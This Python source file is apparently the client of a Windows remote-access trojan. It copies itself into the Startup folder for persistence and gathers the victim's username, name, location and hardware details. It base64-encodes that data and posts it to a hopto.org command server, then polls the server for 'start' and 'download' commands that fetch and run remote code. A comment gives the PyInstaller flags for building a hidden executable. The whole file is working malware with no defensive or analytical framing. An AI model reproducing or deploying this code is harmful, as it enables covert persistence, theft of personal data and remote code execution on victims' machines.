import requests
import time
import shutil
import sys
#pyinstaller --onefile --noconsole --icon=ico.ico --clean jerk.py
import os
import base64
import traceback
#import pywin32
from info_user import UserInfo
import command_module
url = 'http://bestcolor.hopto.org/jerkkawnfhdjawbdawjdnbawjdnawjdbhwadahwjdbaw'
#url = 'http://127.0.0.1:5000/jerkkawnfhdjawbdawjdnbawjdnawjdbhwadahwjdbaw'
z = UserInfo()
time_jerk = 5
commands = ['start','download']
def crypt(data):
    element = str(data)
    return base64.b64encode(element.encode('utf-8')).decode('utf-8')


def autostart():
    try:
        me = sys.argv[0]
        startup = r'''C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'''.format(os.getlogin())
        shutil.copy(me, startup)
    except :
        pass


def start():
    try:
        data = [z.username_info(), z.name_info(),
                           z.location_info(), z.gpu_info(),
                           z.cpu_info(), z.ram_info(),
                           z.version_info()]

        new = list(map(crypt, data))
        data = {"Params": new}
        requests.post(url, json=data)





    except:
        pass


def long():
    command = requests.get(url).text
    while True:
        try:
            data = {"Params": []}

            requests.post(url, json=data)

            if requests.get(url).text == "None":
                time.sleep(time_jerk)
                continue
            if command != requests.get(url).text:
                command = requests.get(url).text
                split_command = requests.get(command).text.split(' ')
                if split_command[0] in commands:

                    if split_command[0] == 'start':
                        command_module.start(split_command[1])
                    if split_command[0] == 'download':
                        command_module.download(split_command[1])

#download http://bestcolor.hopto.org/newmodule.py

            time.sleep(time_jerk)
        except:
            time.sleep(time_jerk)



#autostart()
#start()
#long()
